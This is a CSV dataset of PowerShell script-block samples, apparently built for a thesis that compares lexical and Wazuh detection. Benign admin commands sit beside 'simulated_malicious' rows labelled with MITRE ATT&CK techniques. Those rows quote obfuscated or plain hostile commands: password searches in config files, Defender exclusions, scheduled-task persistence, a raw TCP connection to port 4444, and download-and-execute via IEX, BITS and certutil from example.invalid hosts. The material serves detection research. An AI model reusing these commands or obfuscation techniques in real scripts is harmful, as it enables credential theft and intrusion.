id,label,truth,class_id,dataset_group,scenario,behavior_family,evaluation_group,source_family,tactic,technique,mitre_attack_id,obfuscation_type,safety_class,lexical_input_source,scriptblock_event_id,scriptblock_event_sha256,analysis_text,lexical_score,lexical_reasons,wazuh_prediction,wazuh_alert_count,wazuh_rule_ids,wazuh_rule_levels,wazuh_max_rule_level,wazuh_rule_descriptions,feature_analysis_length,feature_line_count,feature_token_count,feature_special_char_count,feature_special_char_ratio,feature_digit_ratio,feature_whitespace_ratio,feature_entropy,feature_quoted_literal_count,feature_short_literal_count,feature_joined_literal_length,feature_base64_candidate_count,feature_longest_base64_candidate,feature_decoded_view_count,feature_backtick_count,feature_concat_operator_count,feature_join_operator_count,feature_format_operator_count,feature_char_cast_count,feature_suspicious_mixed_case_count,feature_suspicious_mixed_case_tokens,feature_execution_hit_count,feature_execution_hits,feature_raw_execution_hit_count,feature_recovered_execution_hit_count,feature_decoded_execution_hit_count,feature_download_hit_count,feature_download_hits,feature_raw_download_hit_count,feature_recovered_download_hit_count,feature_decoded_download_hit_count,feature_network_c2_hit_count,feature_network_c2_hits,feature_raw_network_c2_hit_count,feature_recovered_network_c2_hit_count,feature_decoded_network_c2_hit_count,feature_defense_evasion_hit_count,feature_defense_evasion_hits,feature_raw_defense_evasion_hit_count,feature_recovered_defense_evasion_hit_count,feature_decoded_defense_evasion_hit_count,feature_persistence_hit_count,feature_persistence_hits,feature_raw_persistence_hit_count,feature_recovered_persistence_hit_count,feature_decoded_persistence_hit_count,feature_credential_access_hit_count,feature_credential_access_hits,feature_raw_credential_access_hit_count,feature_recovered_credential_access_hit_count,feature_decoded_credential_access_hit_count,feature_lolbin_hit_count,feature_lolbin_hits,feature_raw_lolbin_hit_count,feature_recovered_lolbin_hit_count,feature_decoded_lolbin_hit_count,feature_collection_hit_count,feature_collection_hits,feature_raw_collection_hit_count,feature_recovered_collection_hit_count,feature_decoded_collection_hit_count,feature_remote_execution_hit_count,feature_remote_execution_hits,feature_raw_remote_execution_hit_count,feature_recovered_remote_execution_hit_count,feature_decoded_remote_execution_hit_count,feature_discovery_hit_count,feature_discovery_hits,feature_raw_discovery_hit_count,feature_recovered_discovery_hit_count,feature_decoded_discovery_hit_count,feature_indicator_category_count,feature_high_risk_category_count,feature_raw_indicator_hit_count,feature_indicator_hit_count,feature_recovered_indicator_hit_count,feature_decoded_indicator_hit_count,cv_fold,cv_threshold,lexical_prediction,deployment_threshold,lexical_prediction_full_fit,hybrid_or_prediction,hybrid_and_prediction,wazuh_level_3_prediction,wazuh_level_4_prediction,wazuh_level_5_prediction,wazuh_level_7_prediction,wazuh_level_10_prediction,wazuh_level_12_prediction
PST-011,simulated_malicious,1,1,clear_indicator,credential_file_search_clear,credential_file_search,positive:credential_file_search,Source-derived inert offensive behavior pattern,Credential Access,Credentials In Files,T1552.001,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,1740d1f0-125d-479b-8938-5802753cfe3f,5efe4a3e7b12e746bf2dd612df666438ed37be6ed2a9d9f1dc521aed72a04be6,"$indicator='Get-ChildItem -Path ''C:\Users'' -Recurse -Include ''*.config'',''*.xml'' | Select-String -Pattern ''password|token|secret'''; Write-Output $indicator",4,+2:category_credential_access;+1:category_discovery;+1:irregular_case,1,1,91820,4,4,Powershell script recursively collected files from a filesystem search,162,1,16,39,0.240741,0.0,0.067901,4.752823,1,0,116,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,1,3,3,0,0,1,5,0,5,0,1,0,1,1,0,0,0,0
PST-012,benign,0,0,normal_benign,local_group_inventory_normal_v1,local_group_inventory_normal,benign:local_group_inventory_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,d6f8741a-d8a4-4a69-baf0-e23a51467a2d,9eeb7d3945c28bddd3c3a2be53740c56c67a1966be7816967fcddb9531063b86,Get-LocalGroup -ErrorAction SilentlyContinue | Select-Object -First 5 Name,1,+1:irregular_case,0,0,,,0,,74,1,7,5,0.067568,0.013514,0.094595,4.450349,0,0,0,0,0,0,0,0,0,0,0,1,Get-LocalGroup,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-013,benign,0,0,normal_benign,path_check_normal_v2,path_check_normal,benign:path_check_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,bece8900-cfb6-46b0-926e-985a1c6f2df0,7e09fc701c45e5cff2718f15e53dccb608dc3d6dcd1519c33001105b423eff67,Test-Path -Path $env:TEMP; Write-Output 'benign variant 2',0,,1,1,91816,4,4,Powershell script querying system environment variables,58,1,8,8,0.137931,0.017241,0.103448,4.38512,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,1,0,1,1,0,0,0,0
PST-014,simulated_malicious,1,1,obfuscated_indicator,screen_capture_base64_literal_decode_safe,screen_capture,positive:screen_capture,Source-derived inert offensive behavior pattern,Collection,Screen Capture,T1113,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,ae42ea01-e822-4ab0-9378-ada20492737b,f9c741bf21431ad36e991e1a9b77ea94aa0e55537fb2a3617e950fdd752a5c56,$encoded='WwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBHAHIAYQBwAGgAaQBjAHMAXQA6ADoARgByAG8AbQBJAG0AYQBnAGUAKAAkAGIAbQBwACkALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAwACwAMAAsADAALAAwACwAJABiAG0AcAAuAFMAaQB6AGUAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,11,+2:category_defense_evasion;+1:category_collection;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,326,1,10,26,0.079755,0.03681,0.009202,5.087623,1,0,204,1,204,1,0,0,0,0,0,2,FromBase64String;WwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBHAHIAYQBwAGgAaQBjAHMAXQA6ADoARgByAG8AbQBJAG0AYQBnAGUAKAAkAGIAbQBwACkALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAwACwAMAAsADAALAAwACwAJABiAG0AcAAuAFMAaQB6AGUAKQA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,0,1,1,0,,0,0,0,0,,0,0,0,2,1,1,2,1,1,0,4,1,5,1,1,1,1,1,1,1,1,0
PST-015,simulated_malicious,1,1,obfuscated_indicator,scheduled_task_persistence_backtick_literal,scheduled_task_persistence,positive:scheduled_task_persistence,Source-derived inert offensive behavior pattern,Persistence,Scheduled Task/Job: Scheduled Task,T1053.005,backtick_literal,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,3f3e5a2b-8cd9-4bc9-b844-c372f511a15e,cd0009c0bde2d0294e9a0ae722848b5c31535fc3da5aedd448cd945c19e11ce1,$indicator='Register-Sc`hedule`dTask -TaskNa`me ''UpdateCheck'' -Ac`tion (New-Scheduled`TaskActi`on -Exec`ute ''powe`rshell.exe'' -Argument ''-NoProfi`le -Encod`edC`ommand VwBy`AGk`AdABlAC0ATwB1AH`QAcAB1AHQAIAAnAFQA`SABFAFMASQBT`AC0ASQBOAEUAUgBU`A`CcA'')'; Write-Output $indicator,10,+2:category_execution;+2:category_persistence;+2:multiple_high_risk_categories;+1:backtick_obfuscation;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,280,1,32,48,0.171429,0.014286,0.042857,5.129698,1,0,236,0,0,1,18,0,0,0,0,1,AdABlAC0ATwB1AH,1,encodedcommand,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0,1,5,1,5,1,1,0,0,0,0,0,0,0
PST-016,benign,0,0,normal_benign,service_running_filter_normal_v1,service_running_filter_normal,benign:service_running_filter_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,58b17f1c-9887-4c0e-b298-0306504edf15,5abbd8d33dea4d8fce0c4c887d8684021982acafc5e06a0b3a75ee70c1575fe1,"Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status",0,,0,0,,,0,,85,1,10,10,0.117647,0.011765,0.129412,4.400264,1,1,7,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-017,benign,0,0,normal_benign,file_count_normal_v1,file_count_normal,benign:file_count_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,24d1942a-fdee-42b3-869d-56d18d26afe5,410f721d743dbeb88daf39c4e8ea7e05a1fd0276a1b083789d00746da41566c1,(Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count,2,+1:category_discovery;+1:irregular_case,1,1,91816,4,4,Powershell script querying system environment variables,90,1,9,11,0.122222,0.0,0.077778,4.753857,0,0,0,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0,1,5,0,5,0,1,0,1,1,0,0,0,0
PST-018,simulated_malicious,1,1,obfuscated_indicator,defender_exclusion_base64_literal_decode_safe,defender_exclusion,positive:defender_exclusion,Source-derived inert offensive behavior pattern,Defense Evasion,Impair Defenses,T1562.001,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,2eb3b735-85d6-4f8f-bf69-033e5bb97511,7cd8a727df91ad26413903126a3b1d2981d7fe86c10121dd25baddb7212a681f,$encoded='UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAXwBfAFQASABFAFMASQBTAF8ASQBOAEUAUgBUAF8AXwAnACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,10,+2:category_defense_evasion;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,354,1,10,27,0.076271,0.033898,0.008475,5.045999,1,0,232,1,232,1,0,0,0,0,0,2,FromBase64String;UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAXwBfAFQASABFAFMASQBTAF8ASQBOAEUAUgBUAF8AXwAnACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA,0,,0,0,0,0,,0,0,0,0,,0,0,0,4,disableRealtimeMonitoring;exclusionpath;frombase64string;set-mppreference,1,3,3,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,4,3,3,3,4,1,5,1,1,1,1,1,1,1,1,0
PST-019,benign,0,0,hard_benign,hard_benign_base64_decode_config_v1,hard_benign_base64_decode_config,benign:hard_benign_base64_decode_config,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,3dfc415a-003c-4904-85a0-ba6b915502f1,fb98734111da9743f085ad29e8ced4ee2f100906312bd9ed5a3209b6e56fc8ed,$b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)),6,+2:category_defense_evasion;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,140,1,7,20,0.142857,0.05,0.021429,5.121303,1,0,64,1,64,1,0,0,0,0,0,2,FromBase64String;VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,1,5,1,5,1,1,1,1,1,1,1,1,0
PST-020,simulated_malicious,1,1,obfuscated_indicator,dynamic_invocation_partial_combined_obfuscation,dynamic_invocation_partial,positive:dynamic_invocation_partial,Source-derived inert offensive behavior pattern,Execution,PowerShell,T1059.001,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,31139fba-d1d2-4128-9b37-55661bc8753f,033b659077c6e514853be28da822e7fbfaf6be927387cdf0a4676c66abc21cf1,"$parts=@('$CMD=(''','Inv''+''o','Ke-ExP','R`ESSi','on''); &',' (get','-COmm`AND $C','Md) ""Wr','iTe-oU','`tPut ''Th`eSIs','-iner','T''""'); $indicator=($parts -join ''); Write-Output $indicator",9,+2:category_execution;+2:indicator_recovered_from_fragmentation;+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,191,1,25,84,0.439791,0.0,0.052356,4.831684,13,12,85,0,0,0,4,0,1,0,0,0,,1,get-command,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0,3,4,1,5,1,1,0,0,0,0,0,0,0
PST-021,benign,0,0,hard_benign,hard_encoded_file_path_v1,hard_encoded_file_path,benign:hard_encoded_file_path,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,a14fded2-e11e-4daf-aa4a-00c86bcf26f6,81ff657111f1fe81d58bc7bec23118f7424b415662bc3a8a05273205d31d1792,$p = ('C:' + '\ProgramData' + '\Reports' + '\inventory.json'); Write-Output $p,4,+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,78,1,7,23,0.294872,0.0,0.128205,4.591644,4,4,37,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,1,5,0,1,0,0,0,0,0,0,0
PST-022,simulated_malicious,1,1,obfuscated_indicator,clipboard_collection_backtick_literal,clipboard_collection,positive:clipboard_collection,Source-derived inert offensive behavior pattern,Collection,Clipboard Data,T1115,backtick_literal,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,229e971e-1600-4e59-8417-b328179f4a97,e96fd9a9b8b791112c9493639f47f9df0493ded51c686ac1232f1d23ab639486,$indicator='Get-Clipboa`rd -Raw | ConvertTo-Json -Comp`ress'; Write-Output $indicator,5,+1:category_collection;+1:backtick_obfuscation;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,85,1,9,14,0.164706,0.0,0.070588,4.639256,1,0,47,0,0,0,2,0,0,0,0,1,ConvertTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0,3,4,1,5,1,1,0,0,0,0,0,0,0
PST-023,simulated_malicious,1,1,clear_indicator,tcpclient_stream_partial_clear,tcpclient_stream_partial,positive:tcpclient_stream_partial,Source-derived inert offensive behavior pattern,Command and Control,Non-Application Layer Protocol,T1095,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,848c7b5e-53eb-4d43-a616-89ee84ec3766,9d817959cc944d1eaa773f0055bf6528ef75bc36f1fee3f8316ecf4c8ec1a096,"$indicator='$client=New-Object System.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stream=$client.GetStream(); $buffer=New-Object byte[] 4096; $read=$stream.Read($buffer,0,$buffer.Length)'; Write-Output $indicator",3,+2:category_network_c2;+1:irregular_case,0,0,,,0,,215,1,19,48,0.223256,0.083721,0.037209,5.14773,1,0,175,0,0,0,0,0,0,0,0,1,System.Net.Sockets.TcpClient,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0,2,3,1,5,0,1,0,0,0,0,0,0,0
PST-024,simulated_malicious,1,1,clear_indicator,powershell_remoting_clear,powershell_remoting,positive:powershell_remoting,Source-derived inert offensive behavior pattern,Lateral Movement,Windows Remote Management,T1021.006,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,d7e2011a-2c71-4944-940b-21cfb54c0ca8,70c74ecee5401877a4b235c3684aef4e220b13503fc03c1e9d69a5ef7911cddd,$indicator='Invoke-Command -ComputerName ''host.example.invalid'' -ScriptBlock { powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA }'; Write-Output $indicator,6,+2:category_execution;+1:category_remote_execution;+2:multiple_high_risk_categories;+1:base64_candidate,1,1,91823,14,14,"Powershell script used ""Invoke-command"" cmdlet to execute code on remote computer",223,1,11,21,0.09417,0.017937,0.049327,5.165345,1,0,183,1,72,1,0,0,0,0,0,0,,2,encodedcommand;scriptblock,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,2,0,0,0,,0,0,0,2,2,4,4,0,0,4,6,1,5,1,1,1,1,1,1,1,1,1
PST-025,simulated_malicious,1,1,obfuscated_indicator,bits_transfer_combined_obfuscation,bits_transfer,positive:bits_transfer,Source-derived inert offensive behavior pattern,Defense Evasion,BITS Jobs,T1197,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,27618776-c7b5-45e7-b9bd-c9e8db38cb52,e902d63517337d940bfe21ad59d0fbf643d1d69e091f2f18b113242eeede49ae,"$parts=@('sTArt-BI`ts','t`raN','SFER -s','OUrcE ''hTt','pS://BITS','.eXaMpLe.','iNV`aL','Id/paYl`OaD','.bIn'' -d','ESTInAtIOn ''','$Env:TEmp\C','aChe.b','iN'''); $indicator=($parts -join ''); Write-Output $indicator",10,+2:category_download;+2:indicator_recovered_from_fragmentation;+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,1,1,91816,4,4,Powershell script querying system environment variables,215,1,29,81,0.376744,0.0,0.04186,5.023609,14,13,108,0,0,0,4,0,1,0,0,2,ESTInAtIOn;eXaMpLe.,0,,0,0,0,1,start-bitstransfer,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0,4,6,1,5,1,1,1,1,1,0,0,0,0
PST-026,simulated_malicious,1,1,obfuscated_indicator,invoke_webrequest_outfile_backtick_literal,invoke_webrequest_outfile,positive:invoke_webrequest_outfile,Source-derived inert offensive behavior pattern,Command and Control,Ingress Tool Transfer,T1105,backtick_literal,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,2677efa9-c6a5-4fab-a7bb-687e13244cde,499dbcc3b40ccd05b41d55afaed5a8d3567cfbfe29d88d73cd4caf2fa6e55131,$indicator='In`voke-WebR`equest -Uri ''https://files.exa`mple.inva`lid/up`date.bin'' -OutFile ''$env:TEMP\upda`te.bin'''; Write-Output $indicator,3,+2:category_download;+1:backtick_obfuscation,1,1,91816,4,4,Powershell script querying system environment variables,145,1,17,35,0.241379,0.0,0.041379,4.898866,1,0,103,0,0,0,6,0,0,0,0,0,,0,,0,0,0,1,invoke-webrequest,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,2,3,1,5,0,1,1,1,1,0,0,0,0
PST-027,simulated_malicious,1,1,clear_indicator,msxml_com_download_clear,msxml_com_download,positive:msxml_com_download,Source-derived inert offensive behavior pattern,Execution,PowerShell,T1059.001,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,d5a3778d-7dc5-44cf-8b17-d1f8d77a1aab,0080ad119a5b83baf9d4c90db9ced7f7493969bd2b16fa82634ea87277da31a3,"$indicator='$x=New-Object -ComObject MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.invalid/task'',$false); $x.Send(); IEX $x.ResponseText'; Write-Output $indicator",7,+2:category_execution;+2:category_download;+2:multiple_high_risk_categories;+1:irregular_case,1,1,91837,4,4,"Powershell executed ""Get-Content -Stream or Invoke-Expresion"". Possible string execution as code",177,1,16,42,0.237288,0.00565,0.045198,5.150515,1,0,135,0,0,0,0,0,0,0,0,1,MsXml2.ServerXmlHttp,1,iex,1,0,0,2,responseText;serverxmlhttp,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0,0,4,1,5,1,1,1,1,1,0,0,0,0
PST-028,simulated_malicious,1,1,obfuscated_indicator,certutil_transfer_decode_alias_command_reconstruction,certutil_transfer_decode,positive:certutil_transfer_decode,Source-derived inert offensive behavior pattern,Defense Evasion,Deobfuscate/Decode Files or Information,T1140,alias_command_reconstruction,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,b2af3d56-d619-4505-8bf4-abb02b346f02,08ad340e13a2b8b96eb9a4e09b0b3fddb3722aaf163dcc42d985e3775a150e87,"$parts=@('certutil.exe -ur','lcache -spli','t -f https://cert','.example.inval','id/blob.txt C:\__T','HESIS_INERT__\','blob.txt; c','ertutil.exe -deco','de C:\__THESIS_IN','ERT__\blob.txt C:','\__THESIS_INER','T__\stage.bin'); $indicator=[string]::Concat($parts); Write-Output $indicator",11,+2:category_download;+2:category_lolbin;+2:multiple_high_risk_categories;+1:string_reconstruction;+1:fragmented_literals;+1:format_or_char_obfuscation;+2:combined_obfuscation,0,0,,,0,,287,1,32,94,0.327526,0.0,0.041812,5.106061,12,7,180,0,0,0,0,0,1,1,0,0,,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0,2,3,1,5,1,1,0,0,0,0,0,0,0
PST-029,benign,0,0,normal_benign,cert_store_read_normal_v2,cert_store_read_normal,benign:cert_store_read_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,ad0bb236-3bb9-4262-bbe8-04a3c58d0df0,a1d773735dec1cf912c99c38985f628c25a034d3cb03dbdfa600cef067957750,"Get-ChildItem Cert:\CurrentUser\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output 'benign variant 2'",2,+1:category_discovery;+1:irregular_case,1,1,91819,4,4,Powershell script searching filesystem,140,1,14,13,0.092857,0.014286,0.092857,4.717295,1,1,16,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0,3,4,0,5,0,1,0,1,1,0,0,0,0
PST-030,benign,0,0,hard_benign,hard_uri_object_create_v1,hard_uri_object_create,benign:hard_uri_object_create,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,e2d4c628-2d2f-4f40-8f77-70a0fa0356c6,50f14ad0188dac953d5492aa6d47adce8d008f5a6cb30087038223789bb21acf,$u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host,0,,0,0,,,0,,87,1,10,19,0.218391,0.022989,0.045977,4.840378,1,0,53,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-031,benign,0,0,normal_benign,acl_read_normal_v2,acl_read_normal,benign:acl_read_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,d3821113-3a8e-4085-b7f9-db0a2480cb9e,e7e6b475d9afa41ffaf6bc344e4df62ed3833fd7dd8078ecacef45af8f216b2a,"Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output 'benign variant 2'",1,+1:irregular_case,1,1,91816,4,4,Powershell script querying system environment variables,94,1,11,11,0.117021,0.010638,0.106383,4.715151,1,1,16,0,0,0,0,0,0,0,0,1,AccessToString,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,1,0,1,1,0,0,0,0
